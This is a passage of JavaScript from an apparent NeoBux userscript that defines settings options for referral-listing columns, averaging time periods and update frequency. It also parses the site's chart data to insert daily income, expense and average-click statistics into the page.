                        "-0.1px": "-0.1px",
                        "0.0px": "0.0px",
                        "0.1px": "0.1px",
                        "0.2px": "0.2px",
                        "0.3px": "0.3px",
                        "0.4px": "0.4px",
                        "0.5px": "0.5px",
                        "0.6px": "0.6px",
                        "0.7px": "0.7px",
                        "0.8px": "0.8px",
                        "0.9px": "0.9px",
                        "1.0px": "1.0px"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>The space between characters.<br/>Default: 0.0px</span>",
                    value: myAccount.preferences.letterSpacing
                },
                wordSpacing: {
                    type: "select",
                    label: "Word Spacing",
                    options: {
                        "-1.0px": "-1.0px",
                        "-0.9px": "-0.9px",
                        "-0.8px": "-0.8px",
                        "-0.7px": "-0.7px",
                        "-0.6px": "-0.6px",
                        "-0.5px": "-0.5px",
                        "-0.4px": "-0.4px",
                        "-0.3px": "-0.3px",
                        "-0.2px": "-0.2px",
                        "-0.1px": "-0.1px",
                        "0.0px": "0.0px",
                        "0.1px": "0.1px",
                        "0.2px": "0.2px",
                        "0.3px": "0.3px",
                        "0.4px": "0.4px",
                        "0.5px": "0.5px",
                        "0.6px": "0.6px",
                        "0.7px": "0.7px",
                        "0.8px": "0.8px",
                        "0.9px": "0.9px",
                        "1.0px": "1.0px"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>The white space between words.<br/>Default: 0.0px</span>",
                    value: myAccount.preferences.wordSpacing
                },
                header_referralNumberColumn: {
                    type: "html",
                    html: "<br/><p><b>Referral Number Column:</b></p>"
                },
                referralNumber_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Referral Number column be shrunk?</span>",
                    value: myAccount.preferences.referralNumber_shrinkContents
                },
                header_refFlags: {
                    type: "html",
                    html: "<br/><p><b>Referral Flags:</b></p>"
                },
                textifyFlag: {
                    type: "checkbox",
                    label: "Textify Flag",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the flags be textified?<br/>W = White, R = Red, O = Orange, Y = Yellow, G = Green, Bl = Blue, P = Pink, Bk = Black</span>",
                    value: myAccount.preferences.textifyFlag
                },
                textifyFlag_prefix: {
                    type: "text",
                    label: "Separator",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should seperate the flag & text?</span>",
                    value: myAccount.preferences.textifyFlag_prefix
                },
                flag_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Flag column be shrunk?</span>",
                    value: myAccount.preferences.flag_shrinkContents
                },
                header_referralNameColumn: {
                    type: "html",
                    html: "<br/><p><b>Referral Name Column:</b></p>"
                },
                referralName_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Referral Name column be shrunk?</span>",
                    value: myAccount.preferences.referralName_shrinkContents
                },
                header_cameFromColumn: {
                    type: "html",
                    html: "<br/><p><b>Came From Column:</b></p>"
                },
                cameFrom_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Came From column be shrunk?</span>",
                    value: myAccount.preferences.cameFrom_shrinkContents
                },
                header_ownedSinceColumn: {
                    type: "html",
                    html: "<br/><p><b>Owned Since Column:</b></p>"
                },
                referralSince_numerise: {
                    type: "checkbox",
                    label: "Numerise:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the date be turned to days/hrs/mins? If set to false, the settings below are ignored.</span>",
                    value: myAccount.preferences.referralSince_numerise
                },
                referralSince_fullerTimers: {
                    type: "checkbox",
                    label: "Fuller:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date be 'fuller'?<br/>TRUE == days/hours/mins, FALSE == days only</span>",
                    value: myAccount.preferences.referralSince_fullerTimers
                },
                ownedSinceTimer_shortFormat: {
                    type: "checkbox",
                    label: "Short Format:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date be shortened?<br/>TRUE == d/h/m, FALSE == days/hours/mins</span>",
                    value: myAccount.preferences.ownedSinceTimer_shortFormat
                },
                referralSince_replace: {
                    type: "checkbox",
                    label: "Replace:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date replace the text?<br/>TRUE == 10 days, 21 hrs, 16 mins, FALSE == 2009/12/21 17:20 (10 days, 21 hrs, 16 mins)</span>",
                    value: myAccount.preferences.referralSince_replace
                },
                ownedSince_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Owned Since column be shrunk?</span>",
                    value: myAccount.preferences.ownedSince_shrinkContents
                },
                header_nextPaymentColumn: {
                    type: "html",
                    html: "<br/><p><b>Next Payment Column:</b></p>"
                },
                nextPayment_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Next Payment column be shrunk?</span>",
                    value: myAccount.preferences.nextPayment_shrinkContents
                },
                header_lastClickColumn: {
                    type: "html",
                    html: "<br/><p><b>Last Click Column:</b></p>"
                },
                lastClick_numerise: {
                    type: "checkbox",
                    label: "Numerise:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the date be turned to days/hrs/mins? If set to false, the settings below are ignored.</span>",
                    value: myAccount.preferences.lastClick_numerise
                },
                lastClick_fullerTimers: {
                    type: "checkbox",
                    label: "Fuller:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date be 'fuller'?<br/>TRUE == days/hours/mins, FALSE == days only</span>",
                    value: myAccount.preferences.lastClick_fullerTimers
                },
                lastClickTimer_shortFormat: {
                    type: "checkbox",
                    label: "Short Format:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date be shortened?<br/>TRUE == d/h/m, FALSE == days/hours/mins</span>",
                    value: myAccount.preferences.lastClickTimer_shortFormat
                },
                lastClick_replace: {
                    type: "checkbox",
                    label: "Replace:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'numerised' date replace the text?<br/>TRUE == 6 days, FALSE == 2009/12/26 [6 days]</span>",
                    value: myAccount.preferences.lastClick_replace
                },
                lastClick_replaceNilClicks: {
                    type: "checkbox",
                    label: "Replace Nil:",
                    text: "<span style='font-size: x-small; font-style: italic;'>If the user has not clicked yet, should the 'No Clicks Yet' text be removed to narrow the column?</span>",
                    value: myAccount.preferences.lastClick_replaceNilClicks
                },
                lastClick_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Last Click column be shrunk?</span>",
                    value: myAccount.preferences.lastClick_shrinkContents
                },
                header_totalClicksColumn: {
                    type: "html",
                    html: "<br/><p><b>Total Clicks Column:</b></p>"
                },
                totalClicks_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Total Clicks column be shrunk?</span>",
                    value: myAccount.preferences.totalClicks_shrinkContents
                },
                header_avgColumn: {
                    type: "html",
                    html: "<br/><p><b>Average Column:</b></p>"
                },
                exactAverage_show: {
                    type: "checkbox",
                    label: "Exact Average",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the exact average be shown? The regular average uses days.<br/>This 'exact' average is calculated using the age of the referral in minutes.</span>",
                    value: myAccount.preferences.exactAverage_show
                },
                exactAverage_seperator: {
                    type: "text",
                    label: "Separator",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should seperate the normal & exact average?</span>",
                    value: myAccount.preferences.exactAverage_seperator
                },
                columnPrefix_Average: {
                    type: "text",
                    label: "Prefix",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should be displayed before the regular average?</span>",
                    value: myAccount.preferences.columnPrefix_Average
                },
                exactAverage_replace: {
                    type: "checkbox",
                    label: "Replace Average",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the exact average completely replace the regular average?</span>",
                    value: myAccount.preferences.exactAverage_replace
                },
                average_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Average column be shrunk?</span>",
                    value: myAccount.preferences.average_shrinkContents
                },
                header_profitColumn: {
                    type: "html",
                    html: "<br/><p><b>Profit Column:</b></p>"
                },
                showColumn_Profit: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the profit column be shown?</span>",
                    value: myAccount.preferences.showColumn_Profit
                },
                includeRecycleCostInProfitColumn: {
                    type: "checkbox",
                    label: "Recycle Cost:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the profit column deduct the recycle cost from the value to be shown?<br/>TRUE == display {profit}, FALSE == display {profit - cost of one recycle}</span>",
                    value: myAccount.preferences.includeRecycleCostInProfitColumn
                },
                columnPrefix_Profit: {
                    type: "text",
                    label: "Separator",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should show before the profit value? eg, this can be used to make the script only show a number. Default: $</span>",
                    value: myAccount.preferences.columnPrefix_Profit
                },
                profitColumn_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Profit column be shrunk?</span>",
                    value: myAccount.preferences.profitColumn_shrinkContents
                }
            }
        },
        "Referral Listings 2": {
            html: "<p>These settings are used to control what happens on the referral listings pages.</p><p><strong>These settings affect Ultimate-members only:</strong></p>",
            fields:{
                columnHeader_clickText: {
                    type: "html",
                    html: "<br/><p><b>Click Text ('Clicks/day') Column:</b></p>"
                },
                showColumn_clickText: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the 'Click-Text' column be shown?</span>",
                    value: myAccount.ultimatePreferences.showColumn_clickText
                },
                columnPrefix_clickText: {
                    type: "text",
                    label: "Prefix",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should show before the 'Click-Text' value? Default: null</span>",
                    value: myAccount.ultimatePreferences.columnPrefix_clickText
                },
                clickText_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Click Text ('Clicks/day') column be shrunk?</span>",
                    value: myAccount.ultimatePreferences.clickText_shrinkContents
                },
                columnHeader_average1: {
                    type: "html",
                    html: "<br/><p><b>'average1' (A" + myAccount.ultimatePreferences.timePeriod_average1 + ") Column:</b></p>"
                },
                showColumn_Average1: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the average1 column be shown?</span>",
                    value: myAccount.ultimatePreferences.showColumn_Average1
                },
                columnPrefix_Average1: {
                    type: "text",
                    label: "Prefix",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should show before the average1 value? eg, this can be used to make the script only show a number. Default: null</span>",
                    value: myAccount.ultimatePreferences.columnPrefix_Average1
                },
                average1_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the average1 column be shrunk?</span>",
                    value: myAccount.ultimatePreferences.average1_shrinkContents
                },
                columnHeader_average2: {
                    type: "html",
                    html: "<br/><p><b>'average2' (A" + myAccount.ultimatePreferences.timePeriod_average2 + ") Column:</b></p>"
                },
                showColumn_Average2:{
                    type:"checkbox",
                    label:"Show:",
                    text: '<span style="font-size: x-small; font-style: italic;">Should the average2 column be shown?</span>',
                    value: myAccount.ultimatePreferences.showColumn_Average2
                },
                columnPrefix_Average2:{
                    type:"text",
                    label:"Prefix",
                    text: '<span style="font-size: x-small; font-style: italic;">What should show before the average2 value? eg, this can be used to make the script only show a number. Default: null</span>',
                    value: myAccount.ultimatePreferences.columnPrefix_Average2
                },
                average2_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the average2 column be shrunk?</span>",
                    value: myAccount.ultimatePreferences.average2_shrinkContents
                },
                header_sdColumn: {
                    type: "html",
                    html: "<br/><p><b>Standard Deviation (SD) Column:</b></p>"
                },
                showSDEVColumn: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the SD column be shown?</span>",
                    value: myAccount.ultimatePreferences.showSDEVColumn
                },
                columnPrefix_SD: {
                    type: "text",
                    label: "Prefix",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should show before the SD value? eg, this can be used to make the script only show a number. Default: null</span>",
                    value: myAccount.ultimatePreferences.columnPrefix_SD
                },
                SD_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the SDEV column be shrunk?</span>",
                    value: myAccount.ultimatePreferences.SD_shrinkContents
                },
                header_rsaColumn: {
                    type: "html",
                    html: "<br/><p><b>Ratio of Standard deviation and Average (RSA) Column:</b></p>"
                },
                showColumn_RSA: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should RSA column be shown?<br/>NOTE: RSA == Ratio of Standard deviation and Average</span>",
                    value: myAccount.ultimatePreferences.showColumn_RSA
                },
                columnPrefix_RSA: {
                    type: "text",
                    label: "Prefix",
                    text: "<span style='font-size: x-small; font-style: italic;'>What should show before the RSA value? eg, this can be used to make the script only show a number. Default: null</span>",
                    value: myAccount.ultimatePreferences.columnPrefix_RSA
                },
                RSA_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the RSA column be shrunk?</span>",
                    value: myAccount.ultimatePreferences.RSA_shrinkContents
                },
                header_maFooter: {
                    type: "html",
                    html: "<br/><p><b>Minigraph Average Footer:</b></p>"
                },
                showRecentAverage: {
                    type: "checkbox",
                    label: "Show:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should Minigraph Average footer be shown?</span>",
                    value: myAccount.ultimatePreferences.showRecentAverage
                },
                RA_shrinkContents: {
                    type: "checkbox",
                    label: "Shrink:",
                    text: "<span style='font-size: x-small; font-style: italic;'>Should the contents of the Minigraph Average footer be shrunk?</span>",
                    value: myAccount.ultimatePreferences.RA_shrinkContents
                }
            }
        },
        "Time Periods": {
            html:"<p>These settings change what number of days that the averages are calculated for under the graphs.<br/></p>",
            fields:{
                spacer_1: {
                    type: "html",
                    html: "<br/><p>Time Periods for the smaller graphs:</p>"
                },
                timePeriod_s1: {
                    type: "select",
                    label: "Time Period 1",
                    options: {
                        "1": "1",
                        "2": "2", 
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 5</span>",
                    value: myAccount.preferences.timePeriod_s1
                },
                timePeriod_s2: {
                    type: "select",
                    label: "Time Period 2",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 7<br/>NOTE: Time Period 2 should be larger than Time Period 1</span>",
                    value: myAccount.preferences.timePeriod_s2
                },
                timePeriod_s3: {
                    type: "select",
                    label: "Time Period 3",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 10<br/>NOTE: Time Period 3 should be larger than Time Period 2</span>",
                    value: myAccount.preferences.timePeriod_s3
                },
                spacer_2: {
                    type: "html",
                    html: "<br/><p>Time Periods for the larger graphs:</p>"
                },
                timePeriod_1: {
                    type: "select",
                    label: "Time Period 1",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10",
                        "11": "11",
                        "12": "12",
                        "13": "13"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 5</span>",
                    value: myAccount.preferences.timePeriod_1
                },
                timePeriod_2: {
                    type: "select",
                    label: "Time Period 2",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10",
                        "11": "11",
                        "12": "12",
                        "13": "13",
                        "14": "14"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 10<br/>NOTE: Time Period 2 should be larger than Time Period 1</span>",
                    value: myAccount.preferences.timePeriod_2
                },
                timePeriod_3: {
                    type: "select",
                    label: "Time Period 3",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10",
                        "11": "11",
                        "12": "12",
                        "13": "13",
                        "14": "14",
                        "15": "15"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 15<br/>NOTE: Time Period 3 should be larger than Time Period 2</span>",
                    value: myAccount.preferences.timePeriod_3
                },
                spacer_3: {
                    type: "html",
                    html: "<br/><p>Referral statistics sidebar:</p>"
                },
                timePeriod_recent: {
                    type: "select",
                    label: "Recent section",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 10</span>",
                    value: myAccount.preferences.timePeriod_recent
                },
                spacer_4: {
                    type: "html",
                    html: "<br/><p>Ultimate-members only:</p>"
                },
                timePeriod_average1: {
                    type: "select",
                    label: "'Average1' column",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 10</span>",
                    value: myAccount.ultimatePreferences.timePeriod_average1
                },
                timePeriod_average2: {
                    type: "select",
                    label: "'Average2' column",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 7</span>",
                    value: myAccount.ultimatePreferences.timePeriod_average2
                },
                minigraphAvgInterval: {
                    type: "select",
                    label: "Minigraph Average",
                    options: {
                        "1": "1",
                        "2": "2",
                        "3": "3",
                        "4": "4",
                        "5": "5",
                        "6": "6",
                        "7": "7",
                        "8": "8",
                        "9": "9",
                        "10": "10"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>Default: 10</span>",
                    value: myAccount.ultimatePreferences.minigraphAvgInterval
                }
            }
        },
        "Updater Settings": {
            html: "<p>Updater settings:</p>",
            fields: {
                updateFrequency: {
                    type: "select",
                    label: "Update Frequency",
                    options: {
                        "Daily": "86400000",
                        "Weekly": "604800000",
                        "Monthly": "2592000000",
                        "Never": "0"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>How often should the script look for updates?<br/>Recommended: Daily</span>",
                    value: myAccount.preferences.updateFrequency
                }
            }
        },
        "About": {
            html: "<div style='text-align: justify;'><p><strong>About the script</strong></p>" +
                    "<p>This script is designed to make managing your NeoBux account as easy as possible and to put as much information under your fingertips as possible.</p>" +
                    "<p><strong>Want to say thanks?</strong></p>" +
                    "<p>Its always nice to hear from people who like the work I do - just head over to <a href='http://userscripts.org/scripts/discuss/78129'>the userscripts.org discussions</a> and a simple 'I want to have your babies!' or 'You are my superstar!' should suffice, but a generous post simply saying 'Thanks' will always be welcome too.<br/><br/>" +
                    "Incidentally, if you are sure that something isn't quite right and you have already checked that it isn't the flying spaghetti monster playing tricks on you, <a href='http://userscripts.org/scripts/discuss/78129'>the userscripts.org discussions</a> should be your first port of call for feature requests and complaints.</p><br/>" +
                    "<p><strong>Other scripts by Dobrin Dobrev</strong></p>" +
                    "<p>If you like this script, take a look at my other scripts at <a href='http://userscripts.org/users/173064/scripts'>userscripts.org</a>. Not all of them are as useful as this script and usually the description is good enough to figure out what it does, but any questions can be sent to the same place as above.</p></div>",
            fields: {
            }
        }
    };

    function refStatsPage() {
        var 
            chartData,
            i,
            net,
            newCol,
            newRow,
            row,
            spacer,
            table;
        chartData = selectNode("//script[contains(.,'eval(w(')]").textContent.split(" ");
        for (i = 0; i < chartData.length - 1; i += 1) {
            processChartData(chartData[i].split("'")[1]);
        }
// Insert the sidebar statistics area
        insertSidebar();
// Insert summary data at the very bottom of the page
        net = [];
        for (i = 1; i < rentedClicks.totals.length; i += 1) {
            net[i] = (myAccount.rentedReferralClickValue * rentedClicks.totals[i] +
                    myAccount.directReferralClickValue * directClicks.totals[i]) -
                    (recycleCost.totals[i] + autopayCost.totals[i] +
                    renewalCost.totals[i]);
        }
        newRow = document.createElement("tr");
        newCol = document.createElement("td");
        newCol.colSpan = 3;
        newCol.setAttribute("class", "f_r");
        newCol.style.backgroundColor = "#FFFFFF";
        newCol.style.border = "1px solid #888888";
        newCol.style.boxShadow = "0 0 5px rgba(0, 0, 0, 0.3)";
        newCol.style.borderRadius = "5px 5px 5px 5px";
        newCol.style.textAlign = "center";
        newCol.style.verticalAlign = "middle";
        newCol.style.whiteSpace = "nowrap";
        newRow.appendChild(newCol);
        spacer = "&nbsp;&nbsp;&nbsp;&nbsp;";
        newCol.innerHTML =
                localString("dailyNetIncome") + ": " +
                "(" + myAccount.preferences.timePeriod_s3 + ") <span class='f_b'>$" +
                fix(parseFloat(net[myAccount.preferences.timePeriod_s3])) + "</span>" +
                spacer +
                "(" + myAccount.preferences.timePeriod_s2 + ") <span class='f_b'>$" +
                fix(parseFloat(net[myAccount.preferences.timePeriod_s2])) + "</span>" +
                spacer +
                "(" + myAccount.preferences.timePeriod_s1 + ") <span class='f_b'>$" +
                fix(parseFloat(net[myAccount.preferences.timePeriod_s1])) + "</span>" +
                spacer +
                "(3) <span class='f_b'>$" + fix(parseFloat(net[3])) + "</span>" + spacer +
                "(2) <span class='f_b'>$" + fix(parseFloat(net[2])) + "</span>" + spacer +
                "(1) <span class='f_b'>$" + fix(parseFloat(net[1])) + "</span>";
        table = selectNode("//body/div[2]/div/table/tbody/tr/td[last()]/table/tbody/tr[last()]/td/table/tbody");
        row = selectNode("//body/div[2]/div/table/tbody/tr/td[last()]/table/tbody/tr[last()]/td/table/tbody/tr[last()]");
        table.insertBefore(newRow, row);
        newRow = document.createElement("tr");
        newCol = document.createElement("td");
        newCol.colSpan = 3;
        newCol.setAttribute("style", "height:6px;font-size:6px;padding:0px;");
        newCol.innerHTML = "&nbsp;";
        newRow.appendChild(newCol);
        table.insertBefore(newRow, row);
    }

// Function that extracts the data from each chart
    function processChartData(data) {
        var
            chartID,
            dates,
            i,
            projectedDirect,
            projectedRented,
            script,
            totals,
            values;
        script = atob(data);
        chartID = script.split("'")[1];
        customLogger("chartID = " + chartID, 6);
// Extract the dates and values from the chart data
        dates = script.split("[")[1].split("]", 1)[0].replace(/["']{1}/gi, "").split(",");
        values = script.split("[")[3].split("]", 1)[0].split(",");
        for (i = 0; i < values.length; i += 1) {
            values[i] = parseFloat(values[i]);
        }
// Reverse the order of the data so that the most recent data is first
// (unless the chart being processed is the scheduled rental payments chart)
        if (chartID.indexOf("ch_ext_schedule") === -1) {
            dates.reverse();
            values.reverse();
        }
// Calculate running totals for the data in the chart
        totals = [];
        for (i = 0; i < values.length; i += 1) {
            if (i === 0) {
                totals[i] = values[i];
            } else {
                totals[i] = totals[i - 1] + values[i];
            }
        }
// Attach the graphProperties to the relevant variable name
// Variable names for the Referral Statistics page
        if (chartID === "ch_cdd") { // Direct referrals clicks credited
            directClicks = new graphProperties(values, totals);
            projectedDirect = selectNodes("//span[@class='f_b']")[2].textContent;
            directClicks.today_projected = parseFloat(projectedDirect);
            customLogger("directClicks.today_projected = " + directClicks.today_projected, 5);
        } else if (chartID === "ch_cr") { // Rented referrals clicks credited
            rentedClicks = new graphProperties(values, totals);
            projectedRented = selectNodes("//span[@class='f_b']")[4].textContent;
            rentedClicks.today_projected = parseFloat(projectedRented);
            customLogger("rentedClicks.today_projected = " + rentedClicks.today_projected, 5);
        } else if (chartID === "ch_recycle") { // Recycle value
            recycleCost = new graphProperties(values, totals);
        } else if (chartID === "ch_trar") { // Automatic Recycling
            automaticRecycling = new graphProperties(values, totals);
        } else if (chartID === "ch_extensions") { // Extension value
            renewalCost = new graphProperties(values, totals);
        } else if (chartID === "ch_autopay") { // AutoPay value
            autopayCost = new graphProperties(values, totals);
        } else if (chartID === "ch_trpb") { // Transfers to Golden Pack Balance
            transfersToGoldenPackBalance = new graphProperties(values, totals);
        } else if (chartID === "ch_trrb") { // Transfers to Rental Balance
            transfersToRentalBalance = new graphProperties(values, totals);
        } else if (chartID.indexOf("ch_ext_schedule") > -1) { // Total number of referrals with scheduled rental payments
            rentalsDue = new graphProperties(values, totals);
        }
    }

// Function which inserts the 'Statistics Sidebar' to the side of the page
    function insertSidebar() {
// Location to insert the sidebar
        var locationToInsert = selectNode(
                "//td[@width='729']/table/tbody/tr[2]"); // right hand side
        today.projectedRentedClicks = rentedClicks.today_projected * numberOfRentedReferrals;
        today.projectedDirectClicks = directClicks.today_projected * numberOfDirectReferrals;
        today.projectedIncome = myAccount.rentedReferralClickValue * today.projectedRentedClicks +
                myAccount.directReferralClickValue * today.projectedDirectClicks;
        today.income = myAccount.rentedReferralClickValue * rentedClicks.today +
                myAccount.directReferralClickValue * directClicks.today;
        today.expenses = recycleCost.today + autopayCost.today + renewalCost.today;
        today.netIncome = today.income - today.expenses;
        yesterday.income = myAccount.rentedReferralClickValue * rentedClicks.yesterday +
                myAccount.directReferralClickValue * directClicks.yesterday;
        yesterday.expenses = recycleCost.yesterday + autopayCost.yesterday + renewalCost.yesterday;
        yesterday.netIncome = (yesterday.income - yesterday.expenses);
        recent.income = [];
        recent.expenses = [];
        recent.netIncome = [];
        customLogger("rentedClicks.totals.length = " + rentedClicks.totals.length, 5);
        for (var i = 0; i < rentedClicks.totals.length; i += 1) {
            recent.income[i] = myAccount.rentedReferralClickValue * rentedClicks.totals[i] +
                    myAccount.directReferralClickValue * directClicks.totals[i];
            recent.expenses[i] = recycleCost.totals[i] + autopayCost.totals[i] + renewalCost.totals[i];
            recent.netIncome[i] = (recent.income[i] - recent.expenses[i]);
        }
        today.directAverage = (directClicks.today / numberOfDirectReferrals);
        yesterday.directAverage = (directClicks.yesterday / numberOfDirectReferrals);
        recent.directAverage = ((directClicks.recent / numberOfDirectReferrals) / myAccount.preferences.timePeriod_recent);
        if (!numberOfDirectReferrals > 0) {
            today.directAverage = "N/A";
            yesterday.directAverage = "N/A";
            recent.directAverage = "N/A";
        }
        today.rentedAverage = (rentedClicks.today / numberOfRentedReferrals);
        yesterday.rentedAverage = (rentedClicks.yesterday / numberOfRentedReferrals);
        recent.rentedAverage = ((rentedClicks.recent / numberOfRentedReferrals) / myAccount.preferences.timePeriod_recent);
        today.rentedRAverage = ((rentedClicks.today - (recycleCost.today * 100)) / numberOfRentedReferrals);
        yesterday.rentedRAverage = ((rentedClicks.yesterday - (recycleCost.yesterday * 100)) / numberOfRentedReferrals);
        recent.rentedRAverage = (((rentedClicks.recent - (recycleCost.recent * 100)) / numberOfRentedReferrals) / myAccount.preferences.timePeriod_recent);
        if (!numberOfRentedReferrals > 0) {
            today.rentedAverage = "N/A";
            today.rentedRAverage = "N/A";
            yesterday.rentedAverage = "N/A";
            yesterday.rentedRAverage = "N/A";
            recent.rentedAverage = "N/A";
            recent.rentedRAverage = "N/A";
        }
        today.totalRAverage = (((rentedClicks.today + directClicks.today) - (recycleCost.today * 100)) / (numberOfRentedReferrals + numberOfDirectReferrals));
        yesterday.totalRAverage = (((rentedClicks.yesterday + directClicks.yesterday) - (recycleCost.yesterday * 100)) / (numberOfRentedReferrals + numberOfDirectReferrals));
        recent.totalRAverage = (((rentedClicks.recent + directClicks.recent) - (recycleCost.recent * 100)) / (numberOfRentedReferrals + numberOfDirectReferrals) / myAccount.preferences.timePeriod_recent);
        if (numberOfDirectReferrals === 0 && numberOfRentedReferrals === 0) {
            today.totalRAverage = "N/A <small>(zero refs)</small>";
            yesterday.totalRAverage = "N/A <small>(zero refs)</small>";
            recent.totalRAverage = "N/A <small>(zero refs)</small>";
        }
        today.income = rentedClicks.today * myAccount.rentedReferralClickValue +
                directClicks.today * myAccount.directReferralClickValue;
        today.expenses = recycleCost.today + autopayCost.today + renewalCost.today;
        yesterday.income = rentedClicks.yesterday * myAccount.rentedReferralClickValue +
                directClicks.yesterday * myAccount.directReferralClickValue;
        yesterday.expenses = recycleCost.yesterday + autopayCost.yesterday + renewalCost.yesterday;
        recent.income = rentedClicks.recent * myAccount.rentedReferralClickValue +
                directClicks.recent * myAccount.directReferralClickValue;
        recent.expenses = recycleCost.recent + autopayCost.recent + renewalCost.recent;
        var spacer = document.createElement("TD");
        spacer.setAttribute("style", "width: 6px; font-size: 6px; padding: 0px;");
        spacer.innerHTML = "&nbsp;";
        var infoLabel = document.createElement("TD");
        infoLabel.setAttribute("style", "background-color: #ffffff;");
        infoLabel.setAttribute("rowSpan", "3");
        infoLabel.style.border = "1px solid #888888";
        infoLabel.style.boxShadow = "0 0 5px rgba(0, 0, 0, 0.3)";
        infoLabel.style.borderRadius = "5px 5px 5px 5px";
        infoLabel.style.verticalAlign = "top";
        infoLabel.style.paddingTop = "0px";
        infoLabel.style.paddingBottom = "8px";
        infoLabel.style.paddingLeft = "8px";
